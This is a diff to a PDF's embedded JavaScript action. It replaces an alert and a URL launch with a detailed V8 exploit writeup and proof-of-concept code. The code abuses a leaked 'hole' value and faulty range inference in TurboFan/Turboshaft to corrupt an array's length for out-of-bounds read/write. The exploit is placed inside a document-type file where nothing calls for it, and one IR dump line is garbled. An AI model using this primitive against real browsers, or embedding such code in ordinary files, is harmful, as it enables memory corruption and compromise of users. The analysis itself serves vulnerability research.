@@ -60,8 +60,286 @@ endobj
 8 0 obj
 <<
 /JS (
-app.alert("ERROR");
-app.launchURL("https://lilygo.cc");
+// Build d8 using:
+// a) Run once
+//    git checkout 609a85c2a1bd77d6f6905369f4bc4fcf34c5db09
+//    gclient sync
+//    gn gen ./out/x64.debug
+//    gn gen ./out/x64.release
+// b) 
+//    Debug Build:
+//    ninja -C ./out/x64.debug d8
+//      
+//    Release Build:
+//    ninja -C ./out/x64.release d8
+//
+//Writeup by @mistymntncop for the 3rd hole exploitation technique in V8.
+//Original exploit by anonymous V8 hacker (???)
+//
+//Based on the reduced POC on the issue page.
+//Official issue page. Shoutout to Clem and Saelo!!!
+//https://issues.chromium.org/issues/427663123#comment5
+//
+//c:\path\to\v8\v8\out\x64.release\d8 --allow-natives-syntax exploit.js
+//c:\path\to\v8\v8\out\x64.release\d8 --allow-natives-syntax --trace-turbo --trace-turbo-graph exploit.js
+
+/*
+    We create a property ".maybe_hole" on the o JS object. This property can either be the hole object or a string 
+    object depending on the trigger parameter. We access the "length" property on the object in "o.maybe_hole".
+    On a real string object the 32 bit length field would be stored at offset +8 of the js object. The "length" 
+    property access generates corresponding CheckString and StringLength nodes during Turbofan's Inlining phase. 
+    
+    SimplifiedOperatorBuilder::CheckString
+    PropertyAccessBuilder::TryBuildStringCheck
+    JSNativeContextSpecialization::ReduceNamedAccess
+    JSNativeContextSpecialization::ReducePropertyAccess
+    JSNativeContextSpecialization::ReduceJSLoadNamed
+    JSNativeContextSpecialization::Reduce
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/js-native-context-specialization.cc#L1622
+
+    SimplifiedOperatorBuilder::StringLength
+    JSNativeContextSpecialization::BuildPropertyLoad
+    JSNativeContextSpecialization::BuildPropertyAccess
+    JSNativeContextSpecialization::ReduceNamedAccess
+    JSNativeContextSpecialization::ReducePropertyAccess
+    JSNativeContextSpecialization::ReduceJSLoadNamed
+    JSNativeContextSpecialization::Reduce
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/js-native-context-specialization.cc#L3090
+
+    As the name suggests the CheckString node will result in code being emitted that checks if 
+    the object is actually a String. If not then the optimized code will be deoptimized. For this reason we
+    would like to remove the CheckString node.
+    
+    The reason why we store ".maybe_hole" as a property is because we need the "LoadElimination::ReduceLoadField"
+    reducer to replace the CheckString node with a TypeGuard node.
+    
+    LoadElimination::ReduceLoadField
+    LoadElimination::Reduce
+    GraphReducer::Reduce
+    GraphReducer::ReduceTop
+    GraphReducer::ReduceNode
+    LoadEliminationPhase::Run
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/load-elimination.cc#L1029
+    
+    Later on during the Turboshaft's BuildGraph phase the nodes from the Turbofan compilation graph are 
+    converted into corresponding node's in a Turboshaft compiler graph. During the conversion the Turbofan TypeGuard 
+    node does not end up emitting any nodes in the turboshaft compiler graph.
+    
+    turboshaft::`anonymous namespace'::GraphBuilder::Process
+    turboshaft::BuildGraph
+    turboshaft::BuildGraphPhase::Run
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/turboshaft/graph-builder.cc#L2450
+
+
+    Now that we have removed the TypeGuard node we can read the "length" field on the hole object without deoptimizing the optimized function.
+    While the JS string object contains the length field at offset +8 the hole object has the value 0xfff7ffff (-524289) at offset +8. 
+    Normally the StringLength node's type range is inferred to be (0, 535870888) however when StringLength is applied to the hole its range is
+    (-524289, 535870888). This is crazy as a string's length cannot be negative. The hole is never meant to be directly accessible to the user 
+    so type inference is not expected to work properly with it.
+    
+    Typer::Visitor::TypeStringLength
+    Typer::Visitor::TypeNode
+    Typer::Visitor::Reduce
+    Reducer::Reduce
+    GraphReducer::Reduce
+    GraphReducer::ReduceTop
+    GraphReducer::ReduceNode
+    GraphReducer::ReduceGraph
+    Typer::Run
+    TyperPhase::Run
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/turbofan-typer.cc#L2425
+    
+    According to (https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/sign) the Math.sign function should 
+    return 1 if x is positive and return -1 if x is negative. If we call the Math.sign function on the ".length" property it will return 1 
+    in the case of a normal non-empty string object and -1 in the case of the hole.
+    
+    Now we have created a disconnect between the inferred type range information and the actual type range information starting from the 
+    NumberSign node. We use this to create an index variable (i4) whose inferred range is (100, 100) and whose actual range is (0, 100).
+    
+    This variable will later be used as the index of an elements store to an HOLEY_DOUBLE_ELEMENTS JS array. This JS array is initially 
+    created with the capacity of 8 elements. When we try and write a value to the index (i4) the generated code must check if the index
+    is in bounds of the array's elements capacity. If it is in-bounds we can just perform the write however if it is not in bounds we 
+    must extend the array to be at least big enough to contain the index. In during Turbofan's Inlining phase we see a "MaybeGrowFastElements" 
+    node has been generated to do just this. Also, relatedly the length of the array must also be updated to reflect the new length. A number of
+    nodes are emitted to update the length, including NumberLessThan, Branch, NumberAdd, StoreField. These nodes conditionally update the array length 
+    if the index is larger then the array length. The NumberAdd number is used to add 1 to the index, remember if we write to index 100 of the 
+    8 elements array, then the new array length will be 101. This NumberAdd node is used as the value for the StoreField node which writes the 
+    new length at offset +12 of the object.
+    
+    SimplifiedOperatorBuilder::MaybeGrowFastElements
+    JSNativeContextSpecialization::BuildElementAccess
+    JSNativeContextSpecialization::ReduceElementAccess
+    JSNativeContextSpecialization::ReducePropertyAccess
+    JSNativeContextSpecialization::ReduceJSSetKeyedProperty
+    JSNativeContextSpecialization::Reduce
+    Reducer::Reduce
+    GraphReducer::Reduce
+    GraphReducer::ReduceTop
+    GraphReducer::ReduceNode
+    GraphReducer::ReduceGraph
+    InliningPhase::Run
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/simplified-operator.cc#L2155
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/js-native-context-specialization.cc#L3928
+    
+    
+    After Turbofan's Typer phase the range information for the index (i4) is calculated as following. The NumberAdd range is then 
+    calculated based on the index - infer: (101, 101), actual: (0,  101). 
+    
+    let o = {};
+    o.maybe_hole = trigger ? hole : "not the hole";  //both:  (Hole | HeapConstant)
+    let len = o.maybe_hole.length;                   //infer: (0, 535870888), actual: (-524289, 535870888)
+    let sign = Math.sign(len);                       //infer: (0, 1),         actual: (-1, 1)
+    let i1 = 2 - (sign + 1);                         //infer: (0, 1),         actual: (0,  2)
+    let i2 = 5 - (i1 + 4) >> 1;                      //infer: (0, 0),         actual: (-1, 0)
+    let i3 = 1 * i2 + 1;                             //infer: (1, 1),         actual: (0,  1)
+    let i4 = i3 * 100;                               //infer: (100, 100),     actual: (0,  100)
+    
+    
+    Importantly we need the inferred type range for the index to be constant (minimum and maximum equal) and the actual range
+    to contain 0 as the minimum. The intermediate calculations (i1 to i4) just help us get from the initial type ranges to the 
+    desired type ranges that satisfy our needs. If the NumberAdd node's type range is inferred to be constant then during 
+    Turbofan's TypeLowering phase the "ConstantFoldingReducer" will replace the NumberAdd node with a NumberConstant node. 
+    Now the length has been inlined instead of being calculated from the index at runtime.
+    
+    `anonymous namespace'::TryGetConstant
+    ConstantFoldingReducer::Reduce
+    Reducer::Reduce
+    GraphReducer::Reduce
+    GraphReducer::ReduceTop
+    GraphReducer::ReduceNode
+    GraphReducer::ReduceGraph
+    TypedLoweringPhase::Run
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/constant-folding-reducer.cc#L32
+    
+    
+    Relatedly the Branch node for conditionally updating the length is removed by the "CommonOperatorReducer" during 
+    Turbofan's LoadEliminationPhase phase. (Confusingly the exploit still works even if you disable CommonOperatorReducer::ReduceBranch,  
+    it seems that this check still gets removed during a later Turboshaft phase).
+    
+    CommonOperatorReducer::ReduceBranch
+    CommonOperatorReducer::Reduce
+    Reducer::Reduce
+    GraphReducer::Reduce
+    GraphReducer::ReduceTop
+    GraphReducer::ReduceNode
+    GraphReducer::ReduceGraph
+    LoadEliminationPhase::Run
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/common-operator-reducer.cc#L93
+    
+    After Turboshaft's BuildGraph phase the basic block B9 corresponds to the code for extending the elements array 
+    (114: MaybeGrowFastElements) and updating the length of the array (119: Store *(#83 + 12) = #118) using a 
+    constant node (118: Constant()[smi: 101]). 
+
+MERGE B9 <- B8
+    114: MaybeGrowFastElements(#83, #58, #91, #95, #105)[DoubleElements, FeedbackSource(INVALID)]
+    117: Constant()[word64: 202]
+    118: Constant()[smi: 101]
+    119: Store *(#83 + 12) = #118 [tagged base, TaggedSigned, NoWriteBarrier, offset: 12]
+    121: Change(#91)[ZeroExtend, NoAssumption, Word32, Word64]
+    122: Store *(#114 + 8 + #121*8) = #101 [tagged base, Float64, NoWriteBarrier, element size: 2^3, offset: 8]
+    124: Return(#30, #83)[0]
+
+
+    After Turboshaft's Machine Lowering phase we see that the "MaybeGrowFastElements" node has been replaced with multiple
+    basic blocks (B28, B29, B30). 
+    
+    (callstack too fucked up to include here... FUCK C++)
+    https://github.com/v8/v8/blob/609a85c2a1bd77d6f6905369f4bc4fcf34c5db09/src/compiler/turboshaft/machine-lowering-reducer-inl.h#L3465
+    
+    Now B28 compares the index (131: WordBinop(#122, #121)[Mul, Word32]) with the array's
+    length (132: Constant()[word32: 8]) - (not all nodes shown for brevity). If the index is less than the length of the 
+    array we jump to block B30 otherwise we jump to B29. B29 extends the capacity of the array to contain the index. 
+    Blocks B29 and B30 both jump to block B31. Block B31 writes the new length (162: Constant()[smi: 101]) to offset +12
+    of the array (163: Store *(#124 + 12) = #162). So if our index if is less than the array length 8 we will not extend
+    the array but still update the array length to the value 101! Clearly this will cause the array to be in an inconsistent 
+    state as its length will be bigger than its actual elements capacity! 
+    
+MERGE B25 <- B24
+    ...
+    103: Allocate(#88)[Young, tagged aligned]
+    ...
+    131: WordBinop(#122, #121)[Mul, Word32]
+    132: Constant()[word32: 8]
+    ...
+    
+BLOCK B28 <- B26
+    145: Comparison(#131, #132)[UnsignedLessThan, Word32]
+    146: Branch(#145)[B30, B29, True]
+
+BLOCK B29 <- B28
+    148: Shift(#131, #4)[ShiftLeft, Word32]
+    149: TaggedBitcast(#148)[Word32, Tagged, Smi]
+    150: Constant()[heap object: 0x027900035bbd <Code BUILTIN GrowFastDoubleElements>]
+    151: Call(#150, #124, #149)[Code:GrowArrayElements Descriptor:r1s0i3f0]
+    153: DidntThrow(#151)[≡ƒü½≡ƒü½ΓÇâ≡ƒü½≡ƒü½ΓÇâ≡ƒüñ≡ƒü¬ΓÇâ≡ƒü¬ΓÇâi a, 0]
+    155: WordBinop(#153, #4)[BitwiseAnd, Word32]
+    156: Comparison(#155, #6)[Equal, Word32]
+    157: DeoptimizeIf(#155, #137)[negated, CouldNotGrowElements, FeedbackSource(INVALID)]
+    159: Goto()[B31, 0]
+
+BLOCK B30 <- B28
+    160: Goto()[B31, 0]
+
+MERGE B31 <- B30, B29
+    161: Phi(#103, #153)[Tagged]
+    162: Constant()[smi: 101]
+    163: Store *(#124 + 12) = #162 [tagged base, TaggedSigned, NoWriteBarrier, offset: 12]
+    164: Change(#131)[ZeroExtend, NoAssumption, Word32, Word64]
+    165: Store *(#161 + 8 + #164*8) = #134 [tagged base, Float64, NoWriteBarrier, element size: 2^3, offset: 8]
+    167: Return(#6, #124)[0]
+
+    
+    As the new length value was calculated based on faulty index range information it was assumed that
+    only the constant value 100 could be used as the index. In reality the index is not a constant value
+    but can be a value in the range of (0, 100). We use the index value 0 to write to the array. The
+    logic for extending the array capacity is skipped but the array length is still updated to 101. We now
+    have a corrupted array object we can use to perform OOB relative read/writes.
+    
+    inferred:
+    --------------------------------------
+    let sign = 1;                     // 1                    = 1 
+    let i1 = 2 - (sign + 1);          // 2 - (1+1)            = 0     
+    let i2 = 5 - (i1 + 4) >> 1;       // 5 - (0 + 4) >> 1     = 0
+    let i3 = 1 * i2 + 1;              // 1 * 0 + 1            = 1     
+    let i4 = i3 * 100;                // 1 * 100              = 100
+    
+    actual:
+    --------------------------------------
+    let sign = -1;                    // -1                    = -1
+    let i1 = 2 - (sign + 1);          // 2 - (-1 + 1)          = 2     
+    let i2 = 5 - (i1 + 4) >> 1;       // 5 - (2 + 4) >> 1      = -1     
+    let i3 = 1 * i2 + 1;              // 1 * -1 + 1            = 0     
+    let i4 = i3 * 100;                // 0 * 100               = 0
+    
+*/
+function hax(trigger) {
+    let x;
+    delete x?.[y]?.a;
+    let hole = y;
+    let y;
+    
+    let o = {};
+    o.maybe_hole = trigger ? hole : "not the hole";  //both:  (Hole | HeapConstant)
+    let len = o.maybe_hole.length;                   //infer: (0, 535870888), actual: (-524289, 535870888)
+    let sign = Math.sign(len);                       //infer: (0, 1),         actual: (-1, 1)
+    let i1 = 2 - (sign + 1);                         //infer: (0, 1),         actual: (0,  2)
+    let i2 = 5 - (i1 + 4) >> 1;                      //infer: (0, 0),         actual: (-1, 0)
+    let i3 = 1 * i2 + 1;                             //infer: (1, 1),         actual: (0,  1)
+    let i4 = i3 * 100;                               //infer: (100, 100),     actual: (0,  100)
+          
+    let arr = new Array(8);                          //array 8 elements       
+    arr[0] = 13.37;                                  //convert to HOLEY_DOUBLE_ELEMENTS             
+                                                                       
+    arr[i4] = 13.37;                          
+    return arr;
+}
+
+%PrepareFunctionForOptimization(hax);
+let normal = hax(false);
+%DebugPrint(normal);
+%OptimizeFunctionOnNextCall(hax);
+let corrupted = hax(true);
+%DebugPrint(corrupted);
 )
 /S
 /JavaScript
